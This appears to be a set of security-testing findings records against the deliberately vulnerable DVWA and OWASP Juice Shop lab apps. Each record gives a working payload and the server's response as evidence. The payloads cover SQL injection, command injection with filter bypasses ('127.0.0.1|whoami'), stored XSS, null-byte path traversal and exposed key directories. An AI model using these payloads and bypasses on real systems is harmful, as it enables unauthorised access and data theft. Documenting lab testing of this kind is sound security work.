findings.title: SQL Injection in id parameter of SQLi page [security=low]
findings.response_evidence: [security=low] TRUE payload id=1' OR '1'='1 returned 5 seeded user records: (admin/admin), (Gordon/Brown), (Hack/Me), (Pablo/Picasso), (Bob/Smith). FALSE payload id=1' AND '1'='2 returned zero records (page showed only 'User ID:' label with no First name/Surname output). This confirms the id parameter is concatenated unsanitized into the backend SQL query, allowing boolean-based SQLi.

findings.title: OS Command Injection in ip parameter of Ping utility [security=low]
request_sequence: POST http://dvwa/vulnerabilities/exec/ form_data={ip: '127.0.0.1; whoami', Submit: 'Submit'} (session=dvwa_admin, security=low)
findings.response_evidence: [security=low] Response body included normal ping output (PING 127.0.0.1 ... 4 packets transmitted, 4 received, 0% packet loss) followed immediately by the literal string 'www-data' on its own line, which is the web server process identity returned by the injected ';whoami' command appended via shell metacharacter ';'. This confirms unsanitized command injection in the ip field.

findings.title: Stored XSS in guestbook mtxMessage field [security=low]
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ form_data={txtName: 'tester', mtxMessage: '<script id=\"test_token\">window.xss_flag=1</script>', btnSign: 'Sign Guestbook'} (session=dvwa_admin, security=low) -- bypassed client-side maxlength=50 restriction by submitting raw form POST
findings.response_evidence: [security=low] After stored submission, guestbook listing showed new entry 'Name: tester Message:' with the message body rendered blank in extracted visible_text (because the injected <script> tag content is not text, confirming it was stored as raw unescaped HTML rather than displayed literally as text, unlike the benign seeded entry 'This is a test comment.' which displayed as plain text). Server returned HTTP 200 and did not encode/strip the tag.
findings.browser_js_evidence: browser_eval_js("window.xss_flag") on authenticated dvwa_admin session at http://dvwa/vulnerabilities/xss_s/ returned result: 1, proving the injected <script id="test_token">window.xss_flag=1</script> payload executed in the DOM upon page render, confirming stored XSS.

findings.title: SQL Injection in DVWA SQLi page (security=medium) via numeric boolean payload in POST id field
findings.response_evidence: [security=medium] TRUE payload id=1 OR 1=1 returned 5 seeded records: (admin/admin), (Gordon/Brown), (Hack/Me), (Pablo/Picasso), (Bob/Smith) as shown in pre_blocks: "ID: 1 OR 1=1\nFirst name: admin\nSurname: admin" ... through Surname: Smith. FALSE payload id=1 AND 1=2 returned zero records (no pre_blocks, visible_text shows only the dropdown with no ID/First name/Surname output). This confirms the numeric (unquoted) boolean injection bypasses medium-level quote-escaping since id is submitted as an unquoted integer in the SQL query. DVWA security_level confirmed as 'medium' via session_info on all requests.

findings.title: OS Command Injection in DVWA Command Injection page (security=medium) via pipe bypass of ';' and '&&' blacklist
findings.response_evidence: [security=medium] Payload ip=127.0.0.1| whoami bypassed the medium-level blacklist (which blocks ';' and '&&' but not a bare pipe '|'). Response pre_blocks field contained exactly "www-data", and visible_text shows "Enter an IP address: www-data" confirming the whoami command executed server-side and disclosed the web-process identity. DVWA security_level confirmed as 'medium' via session_info on the request.

findings.title: Confidential Acquisitions Memo Exposed via Open Directory Listing
findings.response_evidence:
Step 1: GET /ftp/ returned HTTP 200 with a browsable directory listing including the link/entry 'acquisitions.md 909 12/19/2023 1:12:12 PM' among other sensitive files (incident-support.kdbx, package.json.bak, suspicious_errors.yml, etc.). Step 2: GET /ftp/acquisitions.md returned HTTP 200, content-type text/markdown, with body: "# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year.
This will have a significant stock market impact as we will elaborate in detail in the following paragraph: ... Our shareholders will be excited. It's true. No fake news." This confirms unauthenticated disclosure of a confidential internal memo via an open/browsable directory with no access control.

findings.title: Login Authentication Bypass via SQL Injection in email field
findings.response_evidence: HTTP 200 response body: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}} — the SQLi payload in the email field ( ' OR 1=1-- ) caused the backend query to match the first user record and bypass password verification entirely (arbitrary password 'anything' was accepted). The returned authentication object resolves to umail 'admin@juice-sh.op' (the first/admin user) and basket id (bid) 1, with a valid JWT issued, confirming full authentication bypass via SQL injection.

findings.title: Poison Null-Byte Path Traversal bypasses .bak extension filter in /ftp/
request_sequence: GET http://juiceshop:3000/ftp/package.json.bak (unauth) -> HTTP 403 'Error: Only .md and .pdf files are allowed!'
findings.response_evidence:
Request 1: GET /ftp/package.json.bak returned HTTP 403 with body 'Error: Only .md and .pdf files are allowed!' (fileServer.js extension filter rejects .bak).
Request 2: GET /ftp/package.json.bak%2500.md (URL-encoded null byte + allowed .md extension appended) returned HTTP 200, content-type application/octet-stream, with body being the actual package.json file content: '{\"name\": \"juice-shop\", \"version\": \"6.2.0-SNAPSHOT\", \"description\": \"An intentionally insecure JavaScript Web Application\", ... \"dependencies\": {...}}'. This proves the extension allow-list filter checks only the trailing string (.md) while the underlying filesystem read truncates the path at the null byte, serving the restricted .bak file content. Both required conditions (403 on raw path, 200 with actual restricted file content on null-byte variant) are satisfied.

findings.title: Exposed Encryption-Keys Directory listing reveals premium.key and jwt.pub
request_sequence: GET http://juiceshop:3000/encryptionkeys/ (unauth, Accept: text/html,application/json) -> HTTP 200 directory listing
findings.response_evidence: GET /encryptionkeys/ returned HTTP 200 (content-type text/html) with a serve-index style directory listing, visible_text: 'listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM'. Links present: http://juiceshop:3000/encryptionkeys/jwt.pub and http://juiceshop:3000/encryptionkeys/premium.key. This confirms the directory is browsable without authentication and exposes sensitive cryptographic key files (JWT public key and premium feature signing key) by filename, satisfying the CWE-548 verification criteria.

findings.title: Unauthenticated access to /api/Feedbacks discloses user PII (email fragments + UserId linkage)
request_sequence: GET http://juiceshop:3000/api/Feedbacks (unauth, no Authorization header) -> HTTP 200 JSON feedback records
findings.response_evidence: GET /api/Feedbacks succeeded with HTTP 200 and no authentication/authorization header was sent, returning the full feedback table including the authoring UserId for each entry. Example records: {\"UserId\":1,\"id\":1,\"comment\":\"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)\",\"rating\":5,...} and {\"UserId\":21,\"id\":4,\"comment\":\"Please send me the juicy chatbot NFT in my wallet at /juicy-nft : \\\"purpose betray marriage blame crunch monitor spin slide donate sport lift clutch\\\" (***ereum@juice-sh.op)\",\"rating\":1,...}. Each record exposes the submitting user's internal UserId (1, 2, 3, 21) directly correlated with a partially-visible email address fragment and full domain embedded in the publicly-readable comment field (local-part suffix + '@juice-sh.op'), with no auth required to view this PII-linked data set. This endpoint should require authentication/authorization or fully redact PII; instead any unauthenticated actor can harvest UserId-to-email-fragment correlations across all feedback, which is sufficient to confirm unauthenticated PII exposure (CWE-359).

findings.title: Product Search SQL Injection via q parameter (UNION-based)
findings.response_evidence: Step1: HTTP 500, body visible_text: 'Error: SQLITE_ERROR: near "'%'": syntax error OWASP Juice Shop (Express ^4.17.1) 500 Error: SQLITE_ERROR: near "'%'": syntax error' — confirms single quote breaks out of SQL query and is reflected unsanitized into the backend SQLite query (SQLi presence). Step2: HTTP 200, body: {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]} — the returned record's fields are literally the integers 1-9 supplied in the UNION SELECT clause, proving the injected UNION SELECT 1,2,3,4,5,6,7,8,9-- was executed by the backend in place of the original product query, with no SQL error. Both the error-based and UNION-based behavioral criteria are satisfied, confirming exploitable SQL injection in the product search endpoint.

findings.title: SQL Injection via session-input.php id parameter (DVWA, high security)
findings.response_evidence:
[security=high] At high security, the id parameter is no longer accepted directly on /vulnerabilities/sqli/; it must be set via POST to /vulnerabilities/sqli/session-input.php, which stores it in the PHP session. The underlying query appends LIMIT 1, requiring a trailing comment (#) to neutralize it and allow a boolean injection to return multiple rows.

TRUE payload id=1' OR '1'='1' # => GET /vulnerabilities/sqli/ returned 5 full records (bypassing the LIMIT 1 restriction via the injected OR condition and trailing comment):
  ID: 1' OR '1'='1' # | First name: admin  | Surname: admin
  ID: 1' OR '1'='1' # | First name: Gordon | Surname: Brown
  ID: 1' OR '1'='1' # | First name: Hack   | Surname: Me
  ID: 1' OR '1'='1' # | First name: Pablo  | Surname: Picasso
  ID: 1' OR '1'='1' # | First name: Bob    | Surname: Smith

FALSE payload id=1' AND '1'='2' # => GET /vulnerabilities/sqli/ returned zero records (no <pre> result blocks, visible_text shows only the page chrome and 'Click here to change your ID' link, no ID/First name/Surname output).

This confirms classic SQL injection: the TRUE boolean condition returns multiple seeded user surnames while the FALSE condition returns none, demonstrating that the id value from session-input.php is concatenated unsanitized into the SQL query used by /vulnerabilities/sqli/ at security=high.

findings.title: OS Command Injection via ip parameter (DVWA, high security) using pipe without trailing space
request_sequence: POST http://dvwa/vulnerabilities/exec/  form_data: ip=127.0.0.1|whoami  Submit=Submit  (dvwa_admin session)
findings.response_evidence:
[security=high] At high security, the blacklist strips '; ', '| ' (pipe+space), and '&&', but a pipe with NO trailing space (127.0.0.1|whoami) bypasses the filter. The response page for the 'Ping a device' form rendered the chained command output directly beneath the ping results:

visible_text excerpt: "Enter an IP address: www-data"
pre_blocks: ["www-data"]

The output contains 'www-data', the identity of the web server process, confirming that the injected 'whoami' command executed on the host via the unsanitized ip parameter at security=high.
